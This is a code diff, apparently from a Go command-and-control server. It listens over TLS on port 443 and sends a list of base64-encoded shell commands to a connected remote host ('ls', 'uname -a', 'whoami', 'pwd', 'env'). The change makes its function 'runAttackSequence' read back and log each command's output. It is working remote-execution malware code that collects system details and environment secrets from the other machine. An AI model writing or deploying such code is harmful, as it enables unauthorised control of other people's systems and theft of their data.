@@ -51,10 +51,9 @@ func downloadFile(conn *tls.Conn, path string) {
 func main() {
 	var cmdsToRun = []string{"ls", "uname -a", " whoami", "pwd      ", "env"}
 	arguments := os.Args
-	checkFlags(arguments, len(arguments), cmdsToRun)
+	_ = checkFlags(arguments, len(arguments), cmdsToRun)
 	var PORT string
 	PORT = "443"
-
 	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
 	if err != nil {
 		log.Fatalf("server: loadkeys: %s", err)
@@ -144,7 +143,11 @@ func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 		}
 		cmdsToRun, _ = readFile(arguments[2])
 		break
-	case "-fue":
+
+	//***************************************************//
+	// case "-fue" yet to be implemented//
+	//***************************************************//
+	case "-fue": 
 		if l != 3 {
 			fmt.Println("No filename specified.")
 			os.Exit(1)
@@ -168,14 +171,17 @@ func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 
 func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
 	logger.Println("FILE BEGINS HERE.")
-
+	buffer := make([]byte, 1024)
 	for _, element := range cmdsToRun {
 		element = strings.TrimSpace(element)
 		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
 		logger.Println("EXECUTE: " + " " + element)
 		_, err := conn.Write([]byte(encodedStr))
 		handleError(err)
-		time.Sleep(time.Second)
+		time.Sleep(time.Second*2)
+		_, err = conn.Read(buffer)
+		logger.Println("RES: " + string(buffer[:]))
+		logger.Println("ERR: " + err.Error())
 	}
 	logger.Println("\nDONE.\nFILE ENDS HERE.")
 }
